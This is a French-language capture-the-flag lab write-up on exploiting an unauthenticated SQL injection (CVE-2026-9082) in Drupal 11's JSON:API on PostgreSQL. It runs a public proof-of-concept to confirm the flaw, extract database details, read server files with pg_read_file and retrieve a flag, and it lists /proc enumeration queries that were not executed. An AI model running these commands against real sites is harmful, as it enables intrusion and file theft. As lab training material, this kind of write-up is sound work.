---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Inkwell : SQL Injection anonyme dans Drupal 11 via JSON:API (CVE-2026-9082)"
date: 2026-10-20
categories: [Pentest, Exploitation]
tags: [cve-2026-9082, drupal, sql-injection, json-api, postgresql, lfi, pg_read_file, secdojo, ctf]
---

# Lab Inkwell : injection SQL non authentifiée dans Drupal 11 (CVE-2026-9082)

> **Cible :** `176.16.163.94` (Inkwell, site Drupal 11 / PostgreSQL)
> **Objectif :** partir de zéro, identifier les processus exécutés et exploiter une faille publique pour accéder à des fichiers arbitraires sur le serveur
> **Résultat :** ✅ injection SQL confirmée, lecture arbitraire de fichiers via `pg_read_file`, flag récupéré (1/1, 50/50 points)

## Périmètre

Cible fournie dans le lab : `176.16.163.94` (Inkwell, site Drupal). Les commandes ci-dessous sont limitées à cette instance de lab. Le but indiqué est de confirmer la vulnérabilité publique, d'identifier les services et processus utiles, puis de vérifier l'accès aux fichiers de drapeaux.


## 1. Reconnaissance réseau et identification des services

```bash
nmap -A 176.16.163.94
```

Résultat observé :

```text
Host is up (0.00021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Home | Inkwell
|_http-generator: Drupal 11 (https://www.drupal.org)
|_http-server-header: Apache/2.4.66 (Ubuntu)
| http-robots.txt: 33 disallowed entries (15 shown)
| /core/ /profiles/ /README.md
| /composer/Metapackage/README.txt /composer/Plugin/ProjectMessage/README.md
| /composer/Plugin/Scaffold/README.md /composer/Plugin/VendorHardening/README.txt
| /composer/Template/README.txt /modules/README.txt /sites/README.txt
|_/themes/README.txt /admin/ /comment/reply/ /filter/tips /node/add/
```

**Explication :** `nmap -A` active plusieurs types de détection : identification des versions de services, scripts Nmap par défaut, traceroute et estimation du système d'exploitation. Le scan a trouvé deux ports TCP ouverts parmi les ports examinés : SSH sur `22/tcp` et HTTP sur `80/tcp`.

Le serveur web annonce Apache `2.4.66` sur Ubuntu. Le titre `Home | Inkwell` et l'en-tête Drupal identifient le site comme **Drupal 11**. La liste de `robots.txt` révèle plusieurs chemins habituels de Drupal, mais leur présence n'est pas en soi une preuve de vulnérabilité.

> ℹ️ Ce scan ne détermine pas la version mineure exacte de Drupal ni le moteur de base de données.

## 2. Préparation du PoC

```bash
git clone https://github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC.git
cd CVE-2026-9082-Drupal-PoC
python3 -m venv .venv
source .venv/bin/activate
pip install requests rich
```

**Résultat observé :** le dépôt a été cloné. L'installation avec `pip` a ensuite affiché des tentatives répétées de connexion à `pypi.org`, avec l'erreur :

```text
Failed to establish a new connection: [Errno 101] Network is unreachable
```

> ⚠️ Malgré cet incident, le PoC a été exécuté par la suite et a produit les résultats présentés ci-dessous. La sortie ne précise pas si les modules Python étaient déjà présents, avaient été installés par un autre moyen, ou si la tentative `pip` a finalement abouti.

**Explication :** `git clone` récupère le code du PoC. `python3 -m venv .venv` crée un environnement Python isolé, et `source .venv/bin/activate` l'active. `pip install requests rich` tente d'installer les dépendances du script depuis PyPI. L'erreur réseau concerne l'accès de Kali à PyPI ; elle ne renseigne pas sur la connectivité vers Inkwell ni sur sa vulnérabilité.

> 💡 Le dépôt public du PoC est disponible ici : [CVE-2026-9082 Drupal PoC](https://github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC). L'avis éditeur correspondant est [SA-CORE-2026-004](https://www.drupal.org/sa-core-2026-004), qui indique que la vulnérabilité SQL concerne les sites Drupal utilisant PostgreSQL et peut être exploitée par des utilisateurs anonymes.

## 3. Vérification de la vulnérabilité

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --check
```

Résultat observé :

```text
JSON:API endpoint found and active
Found node types: node/article, node/page
Probing node/article...
Boolean-based probe (OR TRUE vs OR FALSE)...
VULNERABLE — boolean-based confirmed
OR TRUE  → 1 results
OR FALSE → 0 results
Resource type : node/article
```

**Explication :** l'option `--check` demande au PoC de rechercher JSON:API et d'effectuer un test booléen. Le script a trouvé les types de ressources `node/article` et `node/page`. Sur `node/article`, les deux variantes du test ont produit des nombres de résultats différents : un pour la condition toujours vraie (`OR TRUE`) et zéro pour la condition toujours fausse (`OR FALSE`). Le PoC interprète cette différence comme une confirmation de l'injection SQL.

> ℹ️ Le résultat établit que le vecteur testé fonctionne sur l'endpoint JSON:API exposé par cette instance. Il ne signifie pas, à lui seul, que le compte SQL dispose de privilèges d'administrateur du système Linux.

## 4. Identification de la base de données

### Version PostgreSQL

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --version
```

```text
PostgreSQL version: PostgreSQL 18.4 (Ubuntu 18.4-0ubuntu0.26.04.1) on x86_64-pc-linux-gnu,
compiled by gcc (Ubuntu 15.2.0-16ubuntu1) 15.2.0, 64-bit
```

**Explication :** l'option `--version` utilise le canal d'injection confirmé pour extraire la chaîne de version renvoyée par PostgreSQL. Ce résultat établit que la cible utilise PostgreSQL et satisfait donc le prérequis de base de données mentionné dans l'avis Drupal pour CVE-2026-9082.

### Utilisateur SQL et base de données

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --dbinfo
```

```text
Database user: drupal
Database name: drupal
```

**Explication :** `--dbinfo` extrait les informations de contexte de la connexion à la base. Le rôle PostgreSQL utilisé par l'application est `drupal`, et le nom de la base est aussi `drupal`.

> ℹ️ Le rôle SQL `drupal` n'est pas automatiquement l'utilisateur Linux `root` : les permissions du système de fichiers restent déterminantes pour les fonctions de lecture de fichiers PostgreSQL.

### Requête manuelle sur l'utilisateur SQL

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT current_user"
```

```text
Result: drupal
```

**Explication :** `--query` transmet une requête SQL personnalisée au mécanisme d'extraction du PoC. `current_user` renvoie le rôle PostgreSQL actif pour la requête. Le résultat `drupal` confirme l'information obtenue avec `--dbinfo`.

## 5. Lecture des fichiers du lab

### Lecture de /home/local.txt

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT pg_read_file('/home/local.txt')"
```

```text
Result: flag_b37e2d04_21dc_427a_b60c_ac2ca8611faf
```

**Explication :** la fonction PostgreSQL `pg_read_file` tente de lire un fichier accessible au processus serveur de base de données. Dans cette instance, la lecture de `/home/local.txt` a réussi et a renvoyé le drapeau local. Ce résultat démontre un accès en lecture à ce chemin via la base de données.

## 6. Commandes de diagnostic des processus à lancer

> ⚠️ Les commandes suivantes ont été proposées comme prochaines étapes, mais **aucun résultat d'exécution n'apparaît dans les sorties reçues**. Elles ne doivent donc pas être considérées comme déjà réussies.

### Identifier le processus qui exécute la requête PostgreSQL

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT pg_read_file('/proc/self/comm')"
```

`/proc/self/comm` contient le nom du processus correspondant au processus qui effectue la lecture. Comme la fonction est exécutée côté PostgreSQL, `/proc/self` devrait désigner le processus PostgreSQL qui traite la requête, et non directement le processus Apache.

### Lire le statut de ce processus

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT pg_read_file('/proc/self/status')"
```

Ce fichier virtuel de Linux peut donner des informations de statut et d'identifiants d'utilisateur/groupe du processus visible. L'accès et le contenu dépendent des permissions et de l'isolation de la cible.

### Tenter d'énumérer les PID visibles

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT string_agg(pid, ',' ORDER BY pid::int) FROM pg_ls_dir('/proc') AS p(pid) WHERE pid ~ '^[0-9]+$'"
```

Cette requête tente de lister les noms numériques présents dans `/proc`, puis de les agréger en une chaîne de PID. Elle peut échouer si le rôle PostgreSQL ne peut pas appeler `pg_ls_dir`, si les permissions du système l'interdisent, ou si la méthode d'extraction du PoC gère mal la requête.

### Lire le nom d'un processus choisi

Après avoir obtenu un PID, remplacer `PID` par sa valeur numérique :

```bash
python3 CVE-2026-9082.py -u http://176.16.163.94 --query "SELECT pg_read_file('/proc/PID/comm')"
```

Cela tente de lire le nom du processus correspondant. Une erreur ou un résultat vide doit être interprété avec prudence : le processus peut être masqué par l'isolation de `/proc`, inaccessible au compte de base de données ou absent au moment de la requête.

## 7. État récapitulatif

| Vérification | Résultat observé |
| --- | --- |
| Hôte et services | Hôte actif ; SSH 22 et HTTP 80 ouverts dans le scan fourni |
| Serveur Web | Apache 2.4.66 sur Ubuntu |
| CMS | Drupal 11 selon la signature HTTP |
| JSON:API | Endpoint actif ; types `node/article` et `node/page` |
| CVE-2026-9082 | Test booléen confirmé vulnérable |
| Moteur SQL | PostgreSQL 18.4 |
| Rôle et base | `drupal` / `drupal` |
| `/home/local.txt` | Lecture réussie ; drapeau local extrait |
| Processus Linux via `/proc` | Pas encore de résultat d'exécution fourni |

## Lien logique entre les étapes

La reconnaissance Nmap constitue le point de départ : elle confirme que l'hôte répond et identifie le service HTTP Apache. Les en-têtes et la page Inkwell indiquent ensuite que l'application utilise Drupal 11, ce qui permet de choisir un test correspondant à cette plateforme.

Le contrôle `--check` vérifie alors si JSON:API est actif et si le test booléen révèle une injection SQL. Cette étape est nécessaire avant toute extraction : elle confirme que les requêtes du PoC atteignent un chemin vulnérable sans authentification.

Les options `--version` et `--dbinfo`, puis `SELECT current_user`, précisent le contexte de base de données. La détection de PostgreSQL 18.4 confirme le prérequis technique signalé dans l'avis Drupal. L'utilisateur `drupal` identifie le rôle SQL effectif, mais ne signifie pas que ce rôle possède les droits système de `root`.

Enfin, la requête `pg_read_file('/home/local.txt')` s'appuie sur l'injection SQL confirmée pour tester l'impact au niveau du système de fichiers. Le résultat a livré le drapeau local et l'interface du lab a ensuite affiché **1/1 drapeau capturé et 50/50 points**. Les commandes proposées pour consulter `/proc` constituent une étape d'énumération distincte : elles pourraient aider à identifier les processus visibles par PostgreSQL, mais leur exécution n'est pas confirmée dans les éléments reçus.

## Leçons retenues

- Un endpoint **JSON:API** exposé sans authentification sur une application CMS peut constituer une surface d'attaque aussi critique qu'un formulaire web classique — tester systématiquement ces endpoints lors d'une reconnaissance Drupal/Wordpress modernes.
- L'identification du rôle SQL effectif (`current_user`) ne doit jamais être confondue avec un accès système complet : un rôle PostgreSQL non privilégié peut malgré tout lire des fichiers arbitraires via `pg_read_file` si les permissions du système de fichiers le permettent.
- Documenter explicitement les commandes **proposées mais non exécutées** (section 6) plutôt que de les mélanger avec des résultats confirmés est une bonne pratique qui évite toute confusion sur l'état réel de l'investigation.
- Une erreur réseau sur un outil annexe (ici, `pip` ne pouvant pas atteindre PyPI) ne doit pas être confondue avec un problème de connectivité vers la cible — toujours distinguer la chaîne d'outils locale de l'environnement testé.

## Références

1. [Avis officiel Drupal — SA-CORE-2026-004](https://www.drupal.org/sa-core-2026-004) : applicabilité aux installations PostgreSQL et mises à jour correctives
2. [CVE-2026-9082 Drupal PoC](https://github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC) : dépôt du PoC public utilisé pour les vérifications `--check`, `--version`, `--dbinfo` et les requêtes personnalisées
